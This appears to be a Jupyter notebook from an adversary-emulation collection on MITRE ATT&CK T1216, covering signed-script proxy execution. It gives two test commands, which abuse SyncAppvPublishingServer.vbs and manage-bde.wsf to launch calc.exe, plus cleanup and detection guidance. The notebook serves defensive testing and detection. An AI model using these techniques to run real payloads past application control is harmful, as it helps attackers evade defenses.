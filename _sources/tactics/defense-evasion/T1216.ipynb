{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "2116ecd6",
   "metadata": {},
   "source": "# T1216 - System Script Proxy Execution\nAdversaries may use trusted scripts, often signed with certificates, to proxy the execution of malicious files. Several Microsoft signed scripts that have been downloaded from Microsoft or are default on Windows installations can be used to proxy execution of other files.(Citation: LOLBAS Project) This behavior may be abused by adversaries to execute malicious files that could bypass application control and signature validation on systems.(Citation: GitHub Ultimate AppLocker Bypass List)"
  },
  {
   "cell_type": "markdown",
   "id": "cf30d59e",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "fbe545ad",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - SyncAppvPublishingServer Signed Script PowerShell Command Execution",
    "Executes the signed SyncAppvPublishingServer script with options to execute an arbitrary PowerShell command.\nUpon execution, calc.exe will be launched.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nC:\\windows\\system32\\SyncAppvPublishingServer.vbs \"\\n;Start-Process calc\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1705bd1d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1216 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "968e1ccb",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - manage-bde.wsf Signed Script Command Execution",
    "Executes the signed manage-bde.wsf script with options to execute an arbitrary command.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nset comspec=%windir%\\System32\\calc.exe\ncscript %windir%\\System32\\manage-bde.wsf\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "37157b00",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1216 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "c77e8d4d",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nset comspec=%windir%\\System32\\cmd.exe\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0dc1e1db",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1216 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "e5f53774",
   "metadata": {},
   "source": "## Detection\nMonitor script processes, such as `cscript`, and command-line parameters for scripts like PubPrn.vbs that may be used to proxy execution of malicious files."
  },
  {
   "cell_type": "markdown",
   "id": "5cbdc860",
   "metadata": {},
   "source": "\n## Shield Active Defense\n### Behavioral Analytics \n Deploy tools that detect unusual system or user behavior.\n \n\n Instrument a system to collect detailed information about process execution and user activity, develop a sense of normal or expected behaviors, and alert on abnormal or unexpected activity.  This can be accomplished either onboard the target system or by shipping data to a centralized analysis and alerting system.\n#### Opportunity\nThere is an opportunity to detect the presence of an adversary by identifying and alerting on anomalous behaviors.\n#### Use Case\nA defender can look for anomalies in how commands are being executed on a system. This can expose potentially malicious activity.\n#### Procedures\nUse behavioral analytics to detect Living Off The Land Binaries (LOLBins) being used to download and execute a file.\nUse behavioral analytics to identify a system running development tools, but is not used by someone who does development.\nUse behavioral analytics to identify abnormal system processes being used to launch a different process.\n"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}